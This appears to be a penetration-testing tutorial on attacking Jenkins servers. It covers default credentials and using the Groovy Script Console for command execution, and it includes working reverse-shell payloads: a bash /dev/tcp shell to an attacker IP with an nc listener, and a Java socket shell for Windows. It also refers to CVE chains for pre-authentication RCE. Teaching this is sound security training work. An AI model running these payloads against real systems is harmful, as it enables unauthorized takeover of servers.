[Jenkins](https://www.jenkins.io/) is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in Jenkins, including some that allow for remote code execution without requiring authentication. Jenkins is a [continuous integration](https://en.wikipedia.org/wiki/Continuous_integration) server.

## Discovery/Footprinting

Jenkins is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment.

Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.

## Enumeration

The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page.

We may encounter a Jenkins instance that uses weak or default credentials such as `admin:admin` or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test. While rare, we have come across Jenkins during external penetration tests that we were able to attack.

# Attacking Jenkins (RCE & Exploits)

We've confirmed that the host is running Jenkins, and it is configured with weak credentials. Let's check and see what type of access this will give us.

Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the [Script Console](https://www.jenkins.io/doc/book/managing/script-console/). The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or SYSTEM account, so it can be an easy win for us.


## Script Console

The script console can be reached at the URL `http://jenkins.inlanefreight.local:8000/script`. This console allows a user to run Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts, which are an object-oriented Java-compatible language. The language is similar to Python and Ruby. Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed.

Using this script console, it is possible to run arbitrary commands, functioning similarly to a web shell. For example, we can use the following snippet to run the `id` command.
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or [this](https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console) Metasploit module.
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Running the above commands results in a reverse shell connection.
``` bash
nc -lvnp 8443
```

Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). We could run commands on a Windows-based Jenkins install using this snippet:
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

We could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host, swapping out `localhost` and the port for our IP address and listener port.
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


## Miscellaneous Vulnerabilities

Several remote code execution vulnerabilities exist in various versions of Jenkins. One recent exploit combines two vulnerabilities, CVE-2018-1999002 and [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation. Public exploit PoCs exist to exploit a flaw in Jenkins dynamic routing to bypass the Overall / Read ACL and use Groovy to download and execute a malicious JAR file. This flaw allows users with read permissions to bypass sandbox protections and execute code on the Jenkins master server. This exploit works against Jenkins version 2.137.

Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js. This vulnerability requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.
